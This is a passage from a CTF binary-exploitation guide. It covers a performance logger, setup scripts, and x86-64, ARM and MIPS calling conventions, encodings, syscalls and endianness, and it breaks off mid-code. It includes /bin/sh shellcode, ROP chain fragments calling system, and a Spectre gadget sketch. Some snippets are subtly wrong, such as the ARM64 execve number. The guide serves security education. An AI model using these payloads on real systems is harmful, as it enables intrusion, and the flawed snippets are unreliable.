        'blockers': challenge_data.get('blockers', []),
    }
    
    # Load existing data
    try:
        with open(CTF_LOG, 'r') as f:
            data = json.load(f)
    except FileNotFoundError:
        data = []
    
    data.append(entry)
    
    with open(CTF_LOG, 'w') as f:
        json.dump(data, f, indent=2)

def analyze_performance():
    """Analyze personal CTF performance trends"""
    with open(CTF_LOG, 'r') as f:
        data = json.load(f)
    
    # Calculate statistics
    total_challenges = len(data)
    solved = sum(1 for x in data if x['solved'])
    solve_rate = (solved / total_challenges) * 100
    
    avg_time = sum(x['time_spent_minutes'] for x in data) / total_challenges
    
    # Category performance
    categories = {}
    for entry in data:
        cat = entry['category']
        if cat not in categories:
            categories[cat] = {'total': 0, 'solved': 0, 'time': 0}
        
        categories[cat]['total'] += 1
        categories[cat]['solved'] += 1 if entry['solved'] else 0
        categories[cat]['time'] += entry['time_spent_minutes']
    
    print(f"Overall solve rate: {solve_rate:.1f}%")
    print(f"Average time per challenge: {avg_time:.1f} minutes")
    print("\nCategory breakdown:")
    for cat, stats in categories.items():
        cat_solve_rate = (stats['solved'] / stats['total']) * 100
        avg_cat_time = stats['time'] / stats['total']
        print(f"  {cat}: {cat_solve_rate:.1f}% solve rate, {avg_cat_time:.1f}min avg")

# Usage after CTF
log_challenge({
    'name': 'heap_heaven',
    'category': 'pwn',
    'difficulty': 'medium',
    'time': 90,
    'points': 500,
    'solved': True,
    'techniques': ['UAF', 'tcache poisoning', 'one-gadget'],
    'blockers': ['one-gadget constraints took 15min to debug']
})
```

### Tool and Workflow Optimization

**Pre-Competition Setup Checklist**

```bash
#!/bin/bash
# ctf_setup.sh - Run before competition starts

echo "[*] Setting up CTF environment..."

# Create directory structure
mkdir -p ~/ctf/{challenges,tools,notes,writeups}

# Update tools
cd ~/tools
git pull pwntools
git pull peda
git pull one_gadget
pip3 install --upgrade pwntools ropper

# Verify critical tools
echo "[*] Verifying tools..."
which gdb && echo "[+] GDB OK" || echo "[-] GDB missing"
which python3 && echo "[+] Python3 OK" || echo "[-] Python3 missing"
python3 -c "import pwn" && echo "[+] pwntools OK" || echo "[-] pwntools missing"

# Download common libcs
cd ~/ctf/tools
if [ ! -d "libc-database" ]; then
    git clone https://github.com/niklasb/libc-database
fi

# Prepare templates
cp ~/templates/exploit_template.py ~/ctf/
cp ~/templates/analysis_template.md ~/ctf/

# Test remote connectivity
echo "[*] Testing network..."
ping -c 1 8.8.8.8 && echo "[+] Network OK" || echo "[-] Network issue"

echo "[*] Setup complete. Ready for CTF!"
```

**Speed Optimization Techniques**

````markdown
## Workflow Acceleration

**Keyboard shortcuts**:
- tmux: ctrl+b then key (window switching, pane navigation)
- vim/emacs: Learn exploitation-specific snippets
- Terminal: alias common commands (`alias r='python3 exploit.py remote'`)

**Code snippets** (save as shell aliases or vim snippets):
```bash
# .bashrc / .zshrc
alias pwn='python3 -c "from pwn import *"'
alias checksec='checksec --file'
alias ghidra='/opt/ghidra/ghidraRun'

# Quick exploit starter
alias newexp='cp ~/templates/exploit_template.py exploit.py && vim exploit.py'

# Fast remote testing
alias tryexp='for i in {1..5}; do echo "Attempt $i"; python3 exploit.py remote; done'
````

**Automation scripts**:

```python
# quick_analysis.py - Fast initial triage
#!/usr/bin/env python3
import sys
import subprocess
from pwn import *

binary = sys.argv[1]

print("[*] Quick Analysis:", binary)
print("\n[*] Checksec:")
subprocess.run(['checksec', '--file', binary])

print("\n[*] File type:")
subprocess.run(['file', binary])

print("\n[*] Strings (interesting):")
result = subprocess.run(['strings', binary], capture_output=True, text=True)
interesting = [s for s in result.stdout.split('\n') 
               if any(k in s.lower() for k in ['flag', 'win', 'shell', 'admin', 'password'])]
for s in interesting[:10]:
    print(f"  {s}")

print("\n[*] Functions (ghidra import):")
# Auto-launch Ghidra if installed
print("  Run: ghidraRun", binary)
```

### Related Subtopics for Competition Success

**Essential complementary skills**:

- **Scripting automation**: Python/bash for rapid exploit iteration
- **Network debugging**: Wireshark, netcat for protocol analysis
- **Version identification**: libc-database, binary diffing techniques
- **Environment replication**: Docker, patchelf for matching remote setup
- **Collaboration tools**: Git workflows, shared documentation systems

**Advanced competition techniques**:

- **Multi-exploitation**: Chaining multiple bugs for complex bypasses
- **Side-channel attacks**: Timing attacks, cache-based information leaks
- **Symbolic execution**: Angr for automatic exploit generation
- **Fuzzing integration**: AFL++ for discovering vulnerabilities during CTF
- **Kernel exploitation**: If competition includes kernel-level challenges

---

# Architecture-Specific Topics

## x86/x86-64 Specifics

x86-64 is the dominant architecture for modern CTF challenges, requiring deep understanding of calling conventions, instruction encoding, and architectural quirks.

**x86-64 calling conventions**

System V AMD64 ABI (Linux/Unix):

```
Arguments (first 6 integer/pointer):
  RDI    : 1st argument
  RSI    : 2nd argument
  RDX    : 3rd argument
  RCX    : 4th argument
  R8     : 5th argument
  R9     : 6th argument
  [RSP]+ : 7th+ arguments (on stack)

Return value:
  RAX    : 64-bit integer/pointer
  RDX:RAX: 128-bit integer

Floating point (XMM):
  XMM0-XMM7: Float arguments/return (System V)
```

Windows x64 (Microsoft x64):

```
Arguments:
  RCX    : 1st
  RDX    : 2nd
  R8     : 3rd
  R9     : 4th
  [RSP]+ : 5th+
```

**Callee-saved registers**

Must preserve across function calls:

```
RBX, RSP, RBP, R12-R15
XMM6-XMM15
```

Caller-saved (expendable):

```
RAX, RCX, RDX, RSI, RDI, R8-R11
XMM0-XMM5
```

**Stack alignment requirements**

x86-64 ABI requires 16-byte alignment at function entry (after return address pushed):

```
Before CALL:  RSP = 0x7ffffffde7d0 (16-byte aligned)
After CALL:   RSP = 0x7ffffffde7c8 (RSP-8, unaligned by 8)
              RSP must be aligned again by function prologue
```

Misalignment causes crashes in functions using SSE instructions:

```asm
movaps xmm0, [rsp]  ; Requires 16-byte aligned address
```

**Verification in GDB:**

```bash
gdb ./binary
(gdb) break vulnerable
(gdb) run
(gdb) print ($rsp & 0xf)
$1 = 0x8        ; Unaligned (expected after call)
(gdb) stepi
(gdb) print ($rsp & 0xf)
$2 = 0x0        ; Aligned (after prologue adjustment)
```

**Red zone (x86-64 ABI)**

128-byte area below RSP reserved for leaf functions:

```
RSP-0x80 to RSP-0x1: Red zone
RSP              : Stack pointer

Leaf functions (no calls) can use red zone for temporaries:
sub rsp, 0x20    ; Not needed, use red zone instead
mov [rsp-0x30], rax  ; Store in red zone
```

Signal handlers must not use red zone (interrupted code may have stored data there):

```asm
; Signal handler prologue
sub rsp, 0x80    ; Move past red zone
```

**Instruction encoding specifics**

REX prefix enables 64-bit operations:

```asm
mov rax, rbx     ; REX.W prefix (0x48)
Binary: 48 89 d8

vs

mov eax, ebx     ; No REX.W (32-bit, zero-extends)
Binary: 89 d8
```

REX byte format:

```
Bit 7-4: 0100 (REX prefix)
Bit 3  : W (64-bit operation)
Bit 2  : R (REG extension)
Bit 1  : X (SIB extension)
Bit 0  : B (RM extension)
```

**ModRM byte encoding**

Specifies operand locations:

```
Bits 7-6: MOD (addressing mode)
  00 = [reg]
  01 = [reg + disp8]
  10 = [reg + disp32]
  11 = reg (direct)

Bits 5-3: REG (register)
Bits 2-0: RM (register/memory)
```

Example: `mov rax, rbx`

- ModRM = 0xd8 (11 011 000)
- MOD=11 (register direct), REG=3 (rax), RM=0 (rbx)

**SIB byte (Scale-Index-Base)**

Used for complex addressing:

```asm
mov rax, [rbx + rcx*8 + 0x1000]
```

SIB byte:

```
Bits 7-6: Scale (1, 2, 4, 8)
Bits 5-3: Index register
Bits 2-0: Base register
```

**Opcode analysis for gadget finding**

Common instruction bytes:

```
0x48      : REX.W prefix
0x50-0x57 : push r64
0x58-0x5f : pop r64
0x89      : mov r64, r64
0x8b      : mov r64, [mem]
0xc3      : ret
0xc9      : leave
0x0f 0x05 : syscall
```

**Disassembly examples:**

```
48 31 c0       : xor rax, rax
48 89 c7       : mov rdi, rax
48 83 c0 01    : add rax, 1
48 c7 c0 3c 00 00 00 : mov rax, 0x3c
```

**Variable-length instructions**

x86-64 instructions are 1-15 bytes:

```asm
nop              ; 1 byte  (0x90)
add rax, 1       ; 3 bytes (0x48 0x83 0xc0 0x01)
mov rax, 0x...   ; 10 bytes (0x48 0xb8 0x... 0x... 0x... 0x... 0x... 0x... 0x... 0x...)
```

This enables instruction-misalignment tricks (overlapping instructions).

**Syscall mechanism**

Modern x86-64 uses SYSCALL instruction:

```asm
syscall          ; Transition to kernel
                 ; On return: RAX = result
                 ; RCX = return address (saved RIP)
                 ; R11 = saved RFLAGS
```

Old SYSENTER (IA-32):

```asm
sysenter         ; Older method, less reliable
```

**Syscall numbers (x86-64 Linux)**

```
RAX = 0  : read
RAX = 1  : write
RAX = 2  : open
RAX = 3  : close
RAX = 59 : execve
RAX = 60 : exit
RAX = 62 : kill
```

**CPUID and feature detection**

Check CPU capabilities:

```asm
mov eax, 1
cpuid
; ECX contains feature flags
; Test bit 30 (RDRAND support)
test ecx, 0x40000000
jz no_rdrand
```

Feature detection for ASLR/DEP/CET bypass strategies.

**TSX (Transactional Synchronization)**

Detect if transactional memory available:

```python
# Can be abused for side-channel attacks
import ctypes

try:
    # XBEGIN instruction
    code = b'\xc7\xf8\x00\x00\x00\x00'  # xbegin .
    func = ctypes.CFUNCTYPE(ctypes.c_int)(ctypes.cast(
        ctypes.create_string_buffer(code), ctypes.c_void_p))
    result = func()
except:
    print("TSX not supported or aborted")
```

**Branch prediction**

Modern CPUs speculatively execute instructions:

```asm
; Spectre attack
mov rax, [rbx]      ; Load secret
and rax, 1
je .skip
mov ecx, [0x401000 + rax * 4]  ; Load based on secret
.skip:
```

Cache timing reveals speculatively-accessed address.

**x86-64 vs x86-32 differences**

Significant changes in x86-64:

```
All registers 64-bit (extended names)
8 new registers (R8-R15)
Register count doubled for most
Different calling convention
Return address still 64-bit (extended from 32-bit)
Instruction pointer (RIP) 64-bit
Memory addressing: 64-bit pointers
```

**32-bit compatibility mode**

x86-64 can execute 32-bit code:

```bash
gcc -m32 program.c -o program_32
# Runs in 32-bit mode on 64-bit CPU
```

Exploitation can mix 32-bit and 64-bit code if both loaded:

```python
# 32-bit syscall number
mov eax, 11  ; execve (32-bit number)

# vs

mov rax, 59  ; execve (64-bit number)
```

**VDSO (Virtual Dynamically linked Shared Object)**

Kernel-mapped memory providing fast syscalls:

```bash
gdb ./binary
(gdb) info proc mappings | grep vdso
0x7ffff7ffa000     0x7ffff7ffc000     0x2000  r-xp [vdso]
```

VDSO contains optimized syscall entry points (clock_gettime, gettimeofday).

Exploitation: VDSO addresses partially predictable due to kernel ASLR patterns.

**Practice: x86-64 gadget analysis**

```bash
ROPgadget --binary /path/to/binary --all | head -50

# Analyze instruction sequences
objdump -d /path/to/binary | grep -A 3 "pop rdi"
```

**x86 32-bit specifics**

Different calling convention (cdecl):

```
Arguments (on stack):
  [ESP+4]  : 1st argument
  [ESP+8]  : 2nd argument
  [ESP+12] : 3rd argument

Return value:
  EAX      : Return value
  EDX:EAX  : 64-bit return
```

Parameters pushed right-to-left (reverse order).

**Exploitation implications:**

```python
# 32-bit ROP chain
# Must construct arguments on stack
push arg3
push arg2
push arg1
push return_addr
jmp function
```

---

## ARM Exploitation Differences

ARM (Advanced RISC Machine) uses different register layout, calling conventions, and instruction set, requiring specialized exploitation techniques.

**ARM calling convention (EABI)**

Arguments (first 4 in registers):

```
R0, R1, R2, R3  : 1st-4th arguments
[SP]+           : 5th+ arguments

Return value:
R0              : 32-bit return
R0:R1           : 64-bit return

Preserved registers (callee-saved):
R4-R11, R13(SP), R14(LR), R15(PC)
```

**ARM register layout**

```
R0-R3   : Argument/scratch
R4-R11  : Callee-saved
R12     : Scratch
R13 (SP): Stack pointer
R14 (LR): Link register (return address)
R15 (PC): Program counter
```

**Thumb mode**

ARM has two instruction sets:

**ARM (32-bit):** All instructions 32-bit, 4-byte aligned.

**Thumb (16-bit):** Compressed instructions, 2 bytes, mixed 16/32-bit.

Exploit differences:

```asm
; ARM mode
mov r0, #1      ; 4 bytes

; Thumb mode
mov r0, #1      ; 2 bytes (compressed)
```

**Mode detection:**

```bash
objdump -d /path/to/binary | grep "file format"
# If "ARM EABI", check instruction size

readelf -h /path/to/binary
# Machine: ARM

# Thumb mode indicated by LSB of addresses set
0x00008001       ; Thumb (odd address)
0x00008000       ; ARM (even address)
```

**ARM instruction encoding**

ARM conditional execution:

```asm
movne r0, r1     ; Move if not equal (condition suffix)
moveq r0, r1     ; Move if equal
```

Condition codes:

```
EQ (0000) : Equal
NE (0001) : Not equal
CS (0010) : Carry set
CC (0011) : Carry clear
MI (0100) : Minus
PL (0101) : Plus
VS (0110) : Overflow set
VC (0111) : Overflow clear
HI (1000) : Unsigned higher
LS (1001) : Unsigned lower
GE (1010) : Signed >=
LT (1011) : Signed 
GT (1100) : Signed >
LE (1101) : Signed <=
AL (1110) : Always (default)
```

Exploitation: Conditional jumps allow bypassing checks:

```asm
cmp r0, r1
beq pass_check    ; If equal, skip fail
mov r0, #-1       ; Fail
bne exit_fail
pass_check:
mov r0, #0        ; Success
```

Bypass: Set flags before comparison:

```python
# GDB manipulation
(gdb) set $cpsr = 0x60000000  ; Set Z flag (equal)
```

**ARM Thumb mode differences**

Thumb uses conditional suffixes but limited:

```asm
.thumb
mov r0, r1        ; 16-bit thumb instruction
bne loop           ; Conditional branch (16-bit)
```

**ROP in ARM**

Gadgets end with BX LR (branch exchange):

```asm
pop {r0, pc}      ; Equivalent to "ret"
bx lr             ; Return
ldr pc, [sp], #4  ; Load return address from stack
```

**ARM syscall invocation**

ARM syscalls use SWI (software interrupt):

```asm
mov r7, #1        ; syscall number (write)
swi #0            ; ARM EABI syscall
```

Syscall numbers (ARM):

```
1   : exit
2   : fork
3   : read
4   : write
11  : execve
```

**ARM64 (AArch64) specifics**

64-bit ARM architecture:

```
X0-X30  : 64-bit registers
W0-W30  : 32-bit registers (zero-extend on write)
SP      : Stack pointer
LR      : Link register (X30)
PC      : Program counter
```

Calling convention (ARM64):

```
X0-X7   : Arguments and return value
X8      : Indirect result address
X9-X15  : Temporary
X16-X17 : Intra-procedure registers
X18     : Platform register
X19-X28 : Callee-saved
X29     : Frame pointer
X30     : Link register
SP      : Stack pointer
```

**ARM64 syscalls:**

```asm
mov x8, 93       ; syscall number (exit)
svc #0           ; Supervisor call (ARM64)
```

**ARM64 exploit example:**

```asm
; ARM64 /bin/sh shellcode
mov x8, #59      ; execve
ldr x0, =bin_sh  ; filename
mov x1, #0       ; argv = NULL
mov x2, #0       ; envp = NULL
svc #0

bin_sh: .asciz "/bin/sh"
```

**Endianness considerations**

ARM implementations often little-endian (ARM64 always little-endian):

```
Little-endian ARM:
0x01234567 stored as: 67 45 23 01 (at address)

Exploitation: Gadget addresses must account for endianness
```

**ARM position-independent code**

ARM instructions can be PC-relative:

```asm
ldr r0, [pc, #8]  ; Load from PC+8
```

**Exploitation: Gadgets work regardless of load address**

**Branch prediction in ARM**

ARM has branch prediction units:

```asm
b loop            ; Branch (can be speculated)
```

**Spectre attacks apply to ARM**, requiring:

- Cache timing side-channels
- Branch target mispredict abuse

**ARM NEON (SIMD)**

ARM SIMD extension:

```asm
vld1.32 {d0}, [r0]   ; Load 64-bit vector
vadd.i32 d0, d1, d2  ; Vector add
```

**Exploitation: NEON registers (D0-D31) provide additional storage**, complicating exploit development.

**ARM TrustZone**

Secure execution environment:

```
Normal world (user/kernel code)
Secure world (isolated execution)
```

**Exploitation difficulty increases with TrustZone**, requiring:

- Secure monitor call (SMC)
- Secure side-channel attacks

**Practice: ARM ROP chain**

```python
from pwn import *

context.arch = 'arm'

elf = ELF('./binary_arm')
rop = ROP(elf)

# ARM ROP: pop {r0, pc}
rop.raw(pop_r0_pc)
rop.raw(bin_sh_addr)
rop.call('system')

# Thumb ROP: pop {r7, pc} or equivalent
```

**ARM disassembly (objdump):**

```bash
arm-linux-gnueabihf-objdump -d /path/to/binary_arm
```

**Cross-compilation for ARM:**

```bash
arm-linux-gnueabihf-gcc program.c -o program_arm
# Creates 32-bit ARM executable

aarch64-linux-gnu-gcc program.c -o program_arm64
# Creates 64-bit ARM64 executable
```

---

## MIPS Architecture Considerations

MIPS (Million Instructions Per Second) uses different register conventions, delayed branches, and instruction organization, requiring specialized exploitation techniques.

**MIPS register layout**

```
$zero ($0)  : Always zero
$at ($1)    : Assembler temporary
$v0, $v1    : Return values
$a0-$a3     : Arguments (32-bit)
             : Argument+4 for 64-bit in $a0-$a1, $a2-$a3
$t0-$t9     : Temporary
$s0-$s7     : Saved/callee-saved
$k0, $k1    : Kernel reserved
$gp ($28)   : Global pointer
$sp ($29)   : Stack pointer
$fp ($30)   : Frame pointer
$ra ($31)   : Return address
```

**Calling convention (MIPS EABI)**

Arguments:

```
$a0, $a1, $a2, $a3  : First 4 arguments
[SP]+               : 5th+ arguments (on stack)
```

Return value:

```
$v0               : 32-bit return
$v0:$v1           : 64-bit return
```

**MIPS endianness**

Different MIPS implementations:

```
Little-endian (MIPS-LE)  : mips or mipsel
Big-endian (MIPS-BE)     : mipsbe or mips

Affects:
- Instruction encoding
- Memory layout
- Gadget discovery
```

**MIPS instruction format**

R-format (register):

```
Opcode (6-bit) | RS (5-bit) | RT (5-bit) | RD (5-bit) | Shift (5-bit) | Funct (6-bit)
```

I-format (immediate):

```
Opcode (6-bit) | RS (5-bit) | RT (5-bit) | Immediate (16-bit)
```

J-format (jump):

```
Opcode (6-bit) | Address (26-bit)
```

**Common MIPS instruction bytes (little-endian):**

```
0x8f a20000    : lw $v0, 0($sp)
0x27 bdffff    : addiu $sp, $sp, -1
0x03 e00008    : jr $ra
0x00 000000    : nop
```

**Delayed branch slot**

MIPS executes instruction after branch before branching:

```asm
beq $v0, $v1, target
nop                   ; This executes before branch
```

**Exploitation consequence:**

- Gadgets must account for delayed execution
- Branch destination shifted by 1 instruction

**MIPS ROP gadgets**

Common gadgets:

```asm
lw $v0, 0($sp)
jr $ra            ; Return (with NOP in delay slot)

addiu $a0, $sp, 8 ; Compute argument
```

**Gadget search (little-endian MIPS):**

```bash
mips-linux-gnu-objdump -d /path/to/binary_mips
```

**MIPS syscall invocation**

MIPS uses SYSCALL instruction:

```asm
li $v0, 4         ; syscall number (write)
syscall           ; Invoke syscall
```

Syscall numbers (MIPS):

```
1   : exit
2   : fork
3   : read
4   : write
11  : execve
```

**MIPS syscall with delayed branch:**

```asm
jal syscall_handler
syscall           ; In delay slot
```

**MIPS64 specifics**

64-bit MIPS:

```
$a0-$a3  : Still pass first 4 64-bit arguments
           : $a0 = 1st (64-bit), $a1 unused
           : $a2 = 2nd (64-bit), $a3 unused

Doubled argument registers for 64-bit arguments
```

**Pointer size implications:**

```
32-bit MIPS: Pointers 32-bit, addresses 0x00000000-0xffffffff
64-bit MIPS: Pointers 64-bit, addresses 0x0000000000000000-0xffffffffffffffff
```

**MIPS position-independent code**

MIPS uses GOT (Global Offset Table) for position independence:

```asm
lui $gp, %hi(_gp_disp)   ; Load upper immediate for GP
addiu $gp, $gp, %lo(_gp_disp)

lw $t0, %got(symbol)($gp)
```

**Exploitation:**

- Binary base required for absolute jumps
- PC-relative addressing enables code reuse

**MIPS branch instructions**

Conditional branches:

```asm
beq $s0, $s1, target   ; Branch if equal
bne $s0, $s1, target   ; Branch if not equal
blez $s0, target       ; Branch if ≤ 0
bgtz $s0, target       ; Branch if > 0
```

Delayed execution requires accounting for instruction after branch.

**MIPS load delay slot**

Load instructions have delay before use:

```asm
lw $v0, 0($sp)
add $a0, $v0, $v1     ; Reads wrong $v0 (not yet loaded)
```

Exploitation: Schedule instructions to exploit or avoid delay slots.

**MIPS cross-compilation**

```bash
mips-linux-gnu-gcc program.c -o program_mips      # 32-bit
mips64-linux-gnu-gcc program.c -o program_mips64  # 64-bit
```

**MIPS disassembly:**

```bash
mips-linux-gnu-objdump -d /path/to/binary_mips
# Shows instructions with delay slot annotations
```

**MIPS exploitation example:**

```python
from pwn import *

context.arch = 'mips'
context.endian = 'little'  # or 'big'

# Generate /bin/sh shellcode
shellcode = asm("""
    li $v0, 4119            ; execve syscall
    la $a0, bin_sh
    li $a1, 0
    li $a2, 0
    syscall
    
    bin_sh: .asciz "/bin/sh"
""")

# ROP chain
rop = ROP(elf)
rop.raw(lw_gadget)
rop.raw(shellcode_addr)
```

**MIPS-specific vulnerabilities**

**Integer overflow in address calculation:**

```c
void process(int index) {
    int *arr = get_array();
    int value = arr[index];  // index * 4 may overflow
}
```

**MIPS multiplication:**

```asm
mult $a0, $a1           ; Multiply
mflo $v0                ; Move from low (32 bits)
```

Overflow silently discarded.

**Practice: MIPS ROP gadget discovery**

```bash
# Find gadgets in MIPS binary
mips-linux-gnu-objdump -d /path/to/binary_mips | grep -E "jr|jalr"

# Extract return gadgets (jr $ra)
mips-linux-gnu-objdump -d /path/to/binary_mips | grep "jr .*ra"
```

**MIPS exploitation challenges**

1. **Fewer gadgets:** RISC instruction set produces fewer gadget opportunities
2. **Delayed branches:** Complexity in gadget chaining
3. **Endianness variations:** Different exploitation approaches needed
4. **Less common:** Fewer existing exploits available
5. **Tool limitations:** Some tools don't support MIPS well

**Cross-architecture exploitation strategy**

When target architecture unknown:

```python
# Detect architecture
file_output = subprocess.check_output(['file', './binary']).decode()

if 'x86-64' in file_output:
    arch = 'amd64'
elif 'Intel 80386' in file_output:
    arch = 'i386'
elif 'ARM' in file_output:
    if 'AArch64' in file_output:
        arch = 'arm64'
    else:
        arch = 'arm'
elif 'MIPS' in file_output:
    if 'MIPS64' in file_output:
        arch = 'mips64'
    else:
        arch = 'mips'
else:
    arch = 'unknown'

context.arch = arch
```

**Architecture-specific exploitation decision tree:**

```
x86-64:
  ├─ Check RELRO, NX, PIE
  ├─ Use ROP/ret2libc
  └─ Optimize for gadget availability

x86-32:
  ├─ Check RELRO, NX, PIE
  ├─ Simpler calling convention
  └─ More gadgets typically available

ARM:
  ├─ Check Thumb vs ARM mode
  ├─ Handle conditional execution
  └─ Account for LR in ROP

ARM64:
  ├─ Different calling convention
  ├─ Account for x29 (frame pointer)
  └─ Use SVC for syscalls

MIPS:
  ├─ Account for delayed branches
  ├─ Handle GOT-based addressing
  └─ Limited gadget availability
```

**Pwntools architecture support:**

```python
from pwn import *

# Supported architectures
architectures = [
    'amd64', 'i386', 'arm', 'arm64',
    'mips', 'mips64', 'ppc', 'ppc64'
]

# Set context
context.arch = 'arm'
context.endian = 'little'

# Shellcode generation works across architectures
shellcode = asm(shellcraft.sh())
```

**Real-world multi-architecture binary:**

Some binaries contain multiple architectures (FAT binaries on macOS, multi-arch on Android):

```bash
file ./multi_arch_binary
# Output: Mach-O universal binary with 2 architectures: [x86_64:Mach-O 64-bit] [arm64:Mach-O 'arm64']

# Extract specific architecture
lipo ./multi_arch_binary -thin arm64 -output ./binary_arm64
```

---

**Related architecture-specific subtopics essential for comprehensive exploitation:** RISC-V architecture exploitation as RISC-V gains adoption in embedded systems, PowerPC exploitation in legacy systems and IoT devices, and WebAssembly exploitation techniques for browser-based CTF challenges requiring architecture-specific bytecode understanding.

This concludes the comprehensive CTF Binary Exploitation guide covering x86/x86-64, ARM, and MIPS architecture-specific exploitation techniques. Understanding architectural differences enables effective exploitation across diverse platforms encountered in CTF competitions and real-world security assessments.

---

## 32-bit vs 64-bit Exploitation

Fundamental differences between 32-bit and 64-bit systems require distinct exploitation approaches and payload construction.

**Memory addressing differences**

32-bit systems:

```
Address space: 0x00000000 to 0xffffffff (4 GB)
Pointer size: 4 bytes
Register width: 32-bit (EAX, EBX, etc.)

Typical layout:
0x00000000-0x00001000   : NULL page
0x08048000-0x08400000   : Binary (.text, .data, .bss)
0x40000000-0x41000000   : Shared libraries
0xbfff0000-0xc0000000   : Stack
```

64-bit systems:

```
Address space: 0x0000000000000000 to 0xffffffffffffffff (16 EB)
Pointer size: 8 bytes
Register width: 64-bit (RAX, RBX, etc.)

Typical layout:
0x0000000000000000-0x0000000000001000   : NULL page
0x0000555555554000-0x0000555555755000   : Binary (PIE)
0x00007ffff7c00000-0x00007ffff7dd0000   : Libc
0x00007ffffffde000-0x00007ffffffff000   : Stack
0xffffffffffffffff                       : Kernel space (x86-64)
```

**Exploitation implications:**

```python
# 32-bit addresses fit in immediates
p32(0x08048000)  # 4 bytes

# 64-bit addresses require multi-instruction setup
mov rax, 0x4141414141414141   # 10 bytes (movabs)
```

**Return address size**

Return addresses differ in size:

```
32-bit: 4 bytes
64-bit: 8 bytes

Buffer overflow:
32-bit: offset_to_ra = 40 (example)
64-bit: offset_to_ra = 40 (same calculation, but writes 8 bytes)
```

**GDB verification:**

```bash
# 32-bit binary
gdb ./binary_32
(gdb) x/10x $esp
(gdb) x/10x $ebp

# 64-bit binary
gdb ./binary_64
(gdb) x/10x $rsp
(gdb) x/10x $rbp
```

**Argument passing differences**

32-bit (cdecl):

```c
function(arg1, arg2, arg3)
; Arguments on stack
[ESP+4]  : arg1
[ESP+8]  : arg2
[ESP+12] : arg3
[ESP+0]  : return address
```

Assembly:

```asm
push arg3
push arg2
push arg1
call function
```

64-bit (System V AMD64):

```c
function(arg1, arg2, arg3)
; Arguments in registers
RDI  : arg1
RSI  : arg2
RDX  : arg3
```

Assembly:

```asm
mov rdi, arg1
mov rsi, arg2
mov rdx, arg3
call function
```

**Exploitation consequence:**

```python
# 32-bit ROP: Must construct arguments on stack
chain = p32(pop_ret)
chain += p32(arg1)
chain += p32(function_addr)

# 64-bit ROP: Use register gadgets
chain = p64(pop_rdi_ret)
chain += p64(arg1)
chain += p64(pop_rsi_ret)
chain += p64(arg2)
chain += p64(function_addr)
```

**Return value handling**

32-bit:

```asm
mov eax, 0x12345678  ; 32-bit return
```

64-bit:

```asm
mov rax, 0x123456789abcdef0  ; 64-bit return
```

**Stack alignment**

32-bit:

```
ESP must be 4-byte aligned (often)
But less critical than 64-bit
```

64-bit:

```
RSP must be 16-byte aligned at function entry
Misalignment causes crashes with SSE instructions
```

**Verification:**

```bash
gdb ./binary_64
(gdb) break main
(gdb) run
(gdb) print ($rsp & 0xf)
$1 = 0x8    ; After call, should be 0x8 (unaligned by 8 bytes)
```

**Register count**

32-bit x86:

```
EAX, EBX, ECX, EDX, ESI, EDI, EBP, ESP
Limited to 8 general-purpose registers
```

64-bit x86-64:

```
RAX, RBX, RCX, RDX, RSI, RDI, RBP, RSP, R8-R15
16 general-purpose registers (doubled)
```

**Exploitation advantage:**

```
64-bit has more registers:
- More gadget variety
- More parameters passed in registers
- Easier ROP chain construction
```

**Instruction encoding**

32-bit immediate values:

```asm
mov eax, 0xdeadbeef  ; Fits in 32-bit immediate
```

64-bit immediate values:

```asm
mov rax, 0x12345678  ; Only 32-bit value
mov rax, 0x123456789abcdef0  ; Requires movabs (10 bytes)
```

Binary size:

```
32-bit: Generally more compact instructions
64-bit: Often larger instructions (REX prefix)
```

**Shared library differences**

32-bit libc:

```
Typically at 0x40000000-0x41000000 (fixed)
Less ASLR randomization
```

64-bit libc:

```
Typically at 0x7ffff7000000-0x7ffff7200000 (variable)
Full ASLR randomization possible
```

**Exploitation consequence:**

```python
# 32-bit: Can hardcode libc addresses
system_addr = 0x40050000

# 64-bit: Must leak and calculate
leaked_libc = leak_pointer()
libc_base = leaked_libc - offset
system_addr = libc_base + 0x50000
```

**Cross-compilation for comparison**

```bash
# 32-bit binary on 64-bit system
gcc -m32 program.c -o program_32

# 64-bit binary
gcc -m64 program.c -o program_64

# File inspection
file program_32  # ELF 32-bit LSB executable
file program_64  # ELF 64-bit LSB executable
```

**Practice: Compare stack layouts**

```python
from pwn import *

# 32-bit
context.arch = 'i386'
gdb_32 = process('./binary_32')
# (gdb) x/10x $esp

# 64-bit
context.arch = 'amd64'
gdb_64 = process('./binary_64')
# (gdb) x/10x $rsp

# Compare return address sizes
# 32-bit RA: 4 bytes, 64-bit RA: 8 bytes
```

**Shellcode size differences**

32-bit exit shellcode:

```asm
xor eax, eax
mov al, 1        ; exit syscall
int 0x80
; 5 bytes
```

64-bit exit shellcode:

```asm
xor eax, eax
mov al, 60       ; exit syscall
syscall
; 7 bytes (typically larger)
```

**Buffer overflow offset calculation**

32-bit:

```python
pattern = cyclic(100)
crash_addr = 0x43434343
offset = cyclic_find(crash_addr)
# Result: offset (e.g., 40)
```

64-bit:

```python
pattern = cyclic(100)
crash_addr = 0x6363636362626262
offset = cyclic_find(crash_addr)
# Result: offset (e.g., 40, same calculation)
# But return address overwrites 8 bytes instead of 4
```

---

## Endianness Handling

Endianness determines byte order in memory, critically affecting shellcode, gadget addresses, and data interpretation.

**Endianness fundamentals**

Big-endian (BE):

```
Most significant byte first
0x12345678 stored as: 12 34 56 78 (in memory)

Example: Network protocols (TCP/IP)
```

Little-endian (LE):

```
Least significant byte first
0x12345678 stored as: 78 56 34 12 (in memory)

Example: x86, x86-64, ARM (modern)
```

**Architecture endianness**

Little-endian (most common):

```
x86, x86-64, ARM (ARMv6+), MIPS (variants)
```

Big-endian (less common):

```
PowerPC, SPARC, MIPS (variants), 68k
```

**Exploitation implications**

Packing data:

```python
# Little-endian (x86)
from pwn import *
context.endian = 'little'
addr = p64(0x401234)      # Packed LE
# Result: b'\x34\x12\x40\x00\x00\x00\x00\x00'

# Big-endian (PowerPC)
context.endian = 'big'
addr = p64(0x401234)      # Packed BE
# Result: b'\x00\x00\x00\x00\x00\x40\x12\x34'
```

**Unpacking differences:**

```python
# Data from network (big-endian)
data = b'\x12\x34\x56\x78'

# Little-endian interpretation
context.endian = 'little'
value = u32(data)  # 0x78563412

# Big-endian interpretation
context.endian = 'big'
value = u32(data)  # 0x12345678
```

**Shellcode endianness**

Immediate values in instructions affected:

```asm
; Little-endian (x86)
mov eax, 0x12345678

Binary: b8 78 56 34 12  ; Bytes reversed
```

**Pwntools handles automatically:**

```python
context.arch = 'amd64'
context.endian = 'little'

shellcode = asm("""
